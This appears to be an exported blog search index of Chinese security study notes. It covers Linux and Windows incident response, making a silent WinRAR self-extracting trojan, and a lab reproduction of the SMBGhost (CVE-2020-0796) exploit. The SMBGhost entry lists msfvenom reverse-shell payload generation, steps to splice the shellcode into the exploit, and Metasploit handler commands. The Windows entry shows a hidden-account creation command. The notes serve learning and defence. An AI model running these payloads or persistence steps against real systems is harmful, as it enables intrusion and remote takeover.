        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>主要关于Linux应急响应的内容，尝试着使用了大量gif进行辅助笔记</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><p>视频网址：<a href="https://meeting.tencent.com/crw/2VvoqeQ2e8">录制文件 (tencent.com)</a></p><h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><ul><li>写定时任务：<code>crontab -e</code> 查看当前用户的计划任务</li><li>写启动项：<code>cat /etc/rc.local</code> 查看启动项, 不同系统的 <code>rc.local</code> 位置不一定相同</li><li>上传木马</li><li>创建用户</li><li>服务（xx）</li></ul><!--more--><h1 id="以计划任务为示例讲解应急响应"><a href="#以计划任务为示例讲解应急响应" class="headerlink" title="以计划任务为示例讲解应急响应"></a>以计划任务为示例讲解应急响应</h1><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p><code>crontab -e</code> 查看当前用户的计划任务，可以看到显示的指令内容为每分钟执行一次 <code>/root/run.sh</code><br><img src="https://i.imgur.com/7Vysf73.gif" alt="动画2.gif"></p><p>使用 <code>cat</code> 命令查看所执行的指令文件<br><img src="https://i.imgur.com/H3yo5VX.gif" alt="动画3.gif"><br>攻击机获取到 shell<br><img src="https://i.imgur.com/93rs17G.png"></p><h2 id="情景"><a href="#情景" class="headerlink" title="情景"></a>情景</h2><p>攻击机：192.168.187.132<br>受害机：192.168.187.141<br><img src="https://i.imgur.com/jIfHFsH.png"></p><h2 id="应急响应步骤"><a href="#应急响应步骤" class="headerlink" title="应急响应步骤"></a>应急响应步骤</h2><h3 id="1-清除木马文件"><a href="#1-清除木马文件" class="headerlink" title="1.清除木马文件"></a>1.清除木马文件</h3><p>判断标准：运行木马文件后会有一个外联进程<br>判断方法：<br>    <code>netstat -anltp</code> 来查看外联 ip, 最后的 p 是 pid 的意思，这里的外联 ip 的 pid 为 3073 确认可疑文件<br><img src="https://i.imgur.com/IscQ9zi.gif" alt="linux-1.gif"><br>    <code>ls -all /proc/xxx</code> 定位木马文件<code>![linux-2.gif](https://i.imgur.com/ZKIgWLf.gif)    </code>find &#x2F; -name *ceshi.eif&#96;<br><img src="https://i.imgur.com/1jjVPOW.gif" alt="linux-3.gif"></p><p>杀死进程，<br><img src="https://i.imgur.com/FG2Phyf.gif" alt="动画.gif"></p><p>但由于计划任务每分钟会执行一次，所以没有什么效果，需要删除木马文件<br>备份木马样本为 <code>.bak</code> 文件<br><img src="https://i.imgur.com/g9wEiwI.gif" alt="动画4.gif"><br>删除木马文件，这里因为文件在桌面所以直接拖拽到回收站，命令行可以使用 <code>rm -rf 文件名</code> 来删除<br><img src="https://i.imgur.com/HO6oDWS.gif" alt="动画5.gif"></p><p>清理木马痕迹，删除残余文件以及计划任务<br><code>cat</code> 定时任务中的文件查看内容，<code>rm -rf</code> 删除文件命令<br><code>crontab -e</code> 进入定时任务后 i 进入编辑模式然后删除<br><img src="https://i.imgur.com/C4Lp1ky.gif" alt="动画6.gif"></p><h1 id="检查启动项"><a href="#检查启动项" class="headerlink" title="检查启动项"></a>检查启动项</h1><p><code>cat /etc/rc.local</code> 无异常<br><img src="https://i.imgur.com/tUrRwWE.gif" alt="动画8.gif"><br>未发现异常指令<br><code>ls -all /etc/init.d/</code>  无异常<br><img src="https://i.imgur.com/qALy4JV.gif" alt="动画10.gif"></p><p><code>ls -all /etc/rc.d/rc*.d</code>  查看所有计划任务，没有异常<br><img src="https://i.imgur.com/ftWRKyX.gif" alt="动画11.gif"></p><h1 id="检查是否创建用户"><a href="#检查是否创建用户" class="headerlink" title="检查是否创建用户"></a>检查是否创建用户</h1><p><code>cat etc/passwd</code><br><img src="https://i.imgur.com/wIcYzNw.gif" alt="动画12.gif"><br>所有 id 为 1000 以上的都是用户自己创建的<br><img src="https://i.imgur.com/oJpJWaR.png"><br>也可以尝试 <code>cat /etc/shadow</code><br><img src="https://i.imgur.com/SJJSaCX.gif" alt="动画13.gif"><br>这里能看到 admin 用户的账号密码，密码是 md 5 加密<br>如果觉得用户可疑，可以使用<br><code>ls -all /home/admin/.bash_logout</code> 查看用户创建时间<br><img src="https://i.imgur.com/dnLlf7g.gif" alt="动画14.gif"></p><p>或者 <code>history</code> 查看用户执行过的操作<br>如果攻击者使用 <code>history -c</code> 删除了命令，则需要使用<br><code>cat /root/.bash_history</code><br><code>cat /home/admin/.bash_history</code></p><h1 id="查看上传文件"><a href="#查看上传文件" class="headerlink" title="查看上传文件"></a>查看上传文件</h1><p><code>ls -all /tmp/</code> 查看 tmp 目录中的文件<br><img src="https://i.imgur.com/CmnWpDX.gif" alt="动画15.gif"></p><p><code>find / -ctime 1 -name &quot;*&quot;</code> 查看 <code>/</code> 根目录下 24 小时内所有变化文件<br>检查可疑的 <code>.sh</code>, <code>.exe</code>, <code>.elf</code> 文件，最后检查二十四小时内的变化文件<br><img src="https://i.imgur.com/D67WLTs.gif" alt="动画16.gif"></p><p><code>cat /var/spool/cron/root</code> 查看定时任务</p><h1 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h1><p><code>w</code><br><code>who</code><br><code>lastlog</code>  查看最后用户登录<br><code>top</code><br><img src="https://i.imgur.com/niJ9uPk.gif" alt="动画17.gif"></p><p>Ssh 的日志<br><a href="https://meeting.tencent.com/crw/2VvoqeQ296">录制文件 (tencent.com)</a> –1:40:41<br><code>cat /var/log/secure</code> 查看 ssh 登录爆破的命令<br><img src="https://i.imgur.com/RNsvPOF.png"><br>连接成功的记录<br><code>cat /var/log/secure|grep &quot;Accepted password&quot;</code> 来查看登录成功的 ip</p><p>Phpstudy 的日志<br><img src="https://i.imgur.com/a8rni5C.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows应急响应基础学习</title>
      <link href="/2024/09/22/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2024/09/22/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>关于Windows的应急响应相关</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p>通常是指一个组织为了应对各种意外事件的发生所做的准备工作以及在突发事件发生时或者发生后所采取的措施。计算机网络应急响应的对象是指计算机或网络所存储、传输、处理的信息的安全事件，事件的主体可能来自自然界、系统自身故障 (这里的系统包括主机范畴内的问题，也包括网络范畴内的问题)、组织内部或外部的人、计算机病毒或蠕虫等。</p><blockquote><p>[!question]- 先处理受害者及其优先还是分析日志得出攻击路径以及攻击者优先？<br>第一步是处理受害机器</p></blockquote><h1 id="权限维护"><a href="#权限维护" class="headerlink" title="权限维护"></a>权限维护</h1><blockquote><p>[!question]- 假设你作为一个攻击者获取到了权限，接下来应该做什么操作？<br>提升权限，维持权限</p></blockquote><p>在你攻击成功获取的 webshell 一般是后门文件，一旦后门文件删除既可以断开你的 webshell，所以这里需要我们 进行权限维护</p><ol><li><p>生成可执行文件–&gt;在受害机中会多出一个文件</p></li><li><p>隐藏用户–&gt;创建隐藏用户–&gt;使用命令 <code>net user newuser$ password /add</code> –&gt;可以使用事件查看器发现或者查看注册表编辑器路径： <code>计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\DefaultAccount </code></p><ul><li>事件查看器<img src="https://i.imgur.com/8KhE63V.png" alt="8KhE63V.png"></li><li>注册表<br>  <img src="https://i.imgur.com/UkZz8ZM.png" alt="UkZz8ZM.png"></li></ul></li><li><p>进程注入,文件劫持–&gt;生成文件–&gt;在进行注入 dll 时，需要将 dll 上传到目标机器并劫持正常文件–&gt;在受害者机器中会多出一个文件</p></li><li><p>内存马–&gt;特点是无文件落地–&gt;服务重启即可杀死内存马–&gt;识别可以通过看日志或者使用内存马检测工具进行检测</p></li><li><p>启动项–&gt;注册表编辑器查看路径：</p><ol><li><code>计算机\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></li><li><code>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></li></ol></li><li><p>计划任务</p><ol><li>程序：任务计划程序</li><li>命令行创建计划程序：嗯。自己搜去</li></ol></li><li><p>文件隐藏</p></li></ol><h1 id="入侵排查"><a href="#入侵排查" class="headerlink" title="入侵排查"></a>入侵排查</h1><p>调取账号口令列表，检查弱口令账户，查看计划任务、启动项等等<br>通过注册表查看是否存在隐藏账户<br>事件查看器<img src="https://i.imgur.com/mImYkvX.png" alt="mImYkvX.png"><br><img src="https://i.imgur.com/TQsxSZg.png" alt="TQsxSZg.png"></p><h2 id="提及："><a href="#提及：" class="headerlink" title="提及："></a>提及：</h2><p>木马排查工具<br><img src="https://i.imgur.com/lx5rqLD.png"><br>远控工具 cobaltstrike<br><img src="https://i.imgur.com/hHl1JFH.png"><br>    工具使用：<a href="https://meeting.tencent.com/crw/N84kpXwNb5">录制文件 (tencent.com)</a> -1.29.21</p><p>进程资源查看工具： process informer，process explorer 和火绒剑三持</p><p><a href="https://github.com/BlackINT3/OpenArk">BlackINT3&#x2F;OpenArk：适用于 Windows 的下一代 Anti-Rookit（ARK） 工具。 — BlackINT3&#x2F;OpenArk: The Next Generation of Anti-Rookit(ARK) tool for Windows. (github.com)</a></p><p><a href="https://github.com/fanchenio/DawnLauncher">fanchenio&#x2F;DawnLauncher: Windows快捷启动工具，帮助您整理杂乱无章的桌面，分门别类管理您的桌面快捷方式，让您的桌面保持干净整洁。 (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自解压木马测试学习</title>
      <link href="/2024/07/11/%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%9C%A8%E9%A9%AC/"/>
      <url>/2024/07/11/%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>使用winrar进行自解压木马的制作</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><h2 id="1-压缩包文件夹准备，放入木马（触发程序）"><a href="#1-压缩包文件夹准备，放入木马（触发程序）" class="headerlink" title="1. 压缩包文件夹准备，放入木马（触发程序）"></a>1. 压缩包文件夹准备，放入木马（触发程序）</h2><p><img src="https://i.imgur.com/OH6s7pp.png" alt="Pasted image 20240711111126.png"></p><h2 id="2-使用rar制作自解压压缩文件（此处的最后一个路径斜杠打错了，嗯，，正确应该是"><a href="#2-使用rar制作自解压压缩文件（此处的最后一个路径斜杠打错了，嗯，，正确应该是" class="headerlink" title="2. 使用rar制作自解压压缩文件（此处的最后一个路径斜杠打错了，嗯，，正确应该是\)"></a>2. 使用rar制作自解压压缩文件（此处的最后一个路径斜杠打错了，嗯，，正确应该是<code>\</code>)</h2><p><img src="https://i.imgur.com/C4C1bSe.png" alt="Pasted image 20240711112644.png"></p><p><img src="https://i.imgur.com/XJqfDnP.png" alt="Pasted image 20240711111305.png"></p><h2 id="3-模式选择全隐藏"><a href="#3-模式选择全隐藏" class="headerlink" title="3. 模式选择全隐藏"></a>3. 模式选择全隐藏</h2><p><img src="https://i.imgur.com/Wrh3RqX.png" alt="Pasted image 20240711111350.png"></p><p><img src="https://i.imgur.com/ztt4SUo.png" alt="Pasted image 20240711111402.png"></p><h2 id="4-生成自解压木马测试-exe"><a href="#4-生成自解压木马测试-exe" class="headerlink" title="4.生成自解压木马测试.exe"></a>4.生成自解压木马测试.exe</h2><p><img src="https://i.imgur.com/t59APwv.png" alt="Pasted image 20240711111650.png"></p><h2 id="5-启动自解压木马，静默解压到自解压位置并自行触发安装程序"><a href="#5-启动自解压木马，静默解压到自解压位置并自行触发安装程序" class="headerlink" title="5. 启动自解压木马，静默解压到自解压位置并自行触发安装程序"></a>5. 启动自解压木马，静默解压到自解压位置并自行触发安装程序</h2><p><img src="https://i.imgur.com/yyR1ySa.png" alt="Pasted image 20240711111126.png"></p><p><img src="https://i.imgur.com/i9HbFtx.png" alt="Pasted image 20240711112015.png"></p><h2 id="6-后记"><a href="#6-后记" class="headerlink" title="6. 后记"></a>6. 后记</h2><p>嗯。。。这算是配合那个啥子flash弹窗触发的一个自捆绑木马，还挺离谱的。。。，对以前的全家桶下载包有了些许新奇的认知</p><blockquote><p>[!NOTE] Title<br>Contents</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 木马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之黑漏洞参考文档</title>
      <link href="/2024/07/09/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/"/>
      <url>/2024/07/09/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<blockquote class="blockquote-center">            <i class="fa fa-quote-left"></i>            <p>对于永恒之黑漏洞的简单学习和poc的利用</p>            <i class="fa fa-quote-right"></i>          </blockquote><span id="more"></span><p>POC(蓝屏):漏洞证明</p><blockquote><p>下载<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a><br>使用<br><code>pip install ntlm_auth</code></p></blockquote><p> .&#x2F;CVE-2020-0796.py  192.168.30.134</p><!--more--><p> EXP(RCE)：漏洞利用</p><p>下载<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a><br> 接下来使用kali作为攻击机</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.223.128  LPORT=5555 -b &#x27;\x00&#x27; -i 5 -f python &gt; exploit</span><br></pre></td></tr></table></figure><p> 使用vim</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim exploit                     </span><br><span class="line">:%s/buf/USER_PAYLOAD             </span><br><span class="line">:wq!  </span><br></pre></td></tr></table></figure><p> 去文件夹将exploit内容替换到exploit.py</p><p> 参考<a href="https://blog.csdn.net/weixin_63610715/article/details/133847253">https://blog.csdn.net/weixin_63610715/article/details/133847253</a></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">set lhost 192.168.20.128</span><br><span class="line">set lport 5555</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">python exploit.py -ip 192.168.20.128（靶机ip)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><h2 id="一、复现环境"><a href="#一、复现环境" class="headerlink" title="一、复现环境"></a>一、复现环境</h2><p>靶机：windows10 1903 x64ip：192.168.1.6（关闭防火墙）<br>下载地址：<a href="https://sl-m-ssl.xunlei.com/h5/page/download-share/index.html?entry=link&appType=PC&videobtindex=-1&storid=c39vhtrekug5&share_from=dlpage_share_link">https://sl-m-ssl.xunlei.com/h5/page/download-share/index.html?entry=link&amp;appType=PC&amp;videobtindex=-1&amp;storid=c39vhtrekug5&amp;share_from=dlpage_share_link</a><br>攻击机：kali2019ip：192.168.1.10</p><p><img src="https://i.imgur.com/EILRkWU.png"></p><p><img src="https://i.imgur.com/UhnbLnD.png"></p><h2 id="二、检测工具："><a href="#二、检测工具：" class="headerlink" title="二、检测工具："></a>二、检测工具：</h2><h3 id="1-在靶机里下载检测工具：http-dl-qianxin-com-skylar6-CVE-2020-0796-Scanner-zip"><a href="#1-在靶机里下载检测工具：http-dl-qianxin-com-skylar6-CVE-2020-0796-Scanner-zip" class="headerlink" title="1.在靶机里下载检测工具：http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/"></a>1.在靶机里下载检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/</a></h3><h3 id="2-运行工具，检测到漏洞风险"><a href="#2-运行工具，检测到漏洞风险" class="headerlink" title="2.运行工具，检测到漏洞风险"></a>2.运行工具，检测到漏洞风险</h3><p><img src="https://i.imgur.com/lHXZ6BO.png"></p><h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>POC下载：</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol><li>在kali中利用MSF生成木马：</li></ol><p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.129 LPORT=5555 -b &#39;\x00&#39; -i 1 -f python &gt; exploit</code></p><p>&#x2F;&#x2F; -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp 设置payload为windows64位meterpreter控制台下的反向连接<br>&#x2F;&#x2F; LPORT&#x3D;6666 设置开发端口为6666<br>&#x2F;&#x2F; -b ‘\x00’ 设置在生成的程序中避免出现’\x00’<br>&#x2F;&#x2F; -i 1 设置编码次数为一次<br>&#x2F;&#x2F; -f python 设置生成python格式文件</p><h3 id="2-用生成的shellcode将POC文件里exploit-py中的一部分替换掉，直接复制粘贴，将buf替换成USER-PAYLOAD保存"><a href="#2-用生成的shellcode将POC文件里exploit-py中的一部分替换掉，直接复制粘贴，将buf替换成USER-PAYLOAD保存" class="headerlink" title="2.用生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD保存"></a>2.用生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD保存</h3><p><img src="https://i.imgur.com/oTLY6a1.png"></p><h3 id="3-kali开启监听"><a href="#3-kali开启监听" class="headerlink" title="3. kali开启监听"></a>3. kali开启监听</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 192.168.20.128</span><br><span class="line">set lport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="4-运行exp"><a href="#4-运行exp" class="headerlink" title="4. 运行exp"></a>4. 运行exp</h3><p><code>python3 exploit.py -ip 192.168.20.128</code><br><img src="https://i.imgur.com/7NYgHXA.png"></p><p>如果失败，多试几十次，中间会蓝屏，等各种情况，属于正常行为</p><h3 id="5-命令执行"><a href="#5-命令执行" class="headerlink" title="5. 命令执行"></a>5. 命令执行</h3><p><img src="/../img/image%205.webp"></p><h3 id="6-简易原理图"><a href="#6-简易原理图" class="headerlink" title="6. 简易原理图"></a>6. 简易原理图</h3><p><img src="/../img/Pasted%20image%2020240711201750.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
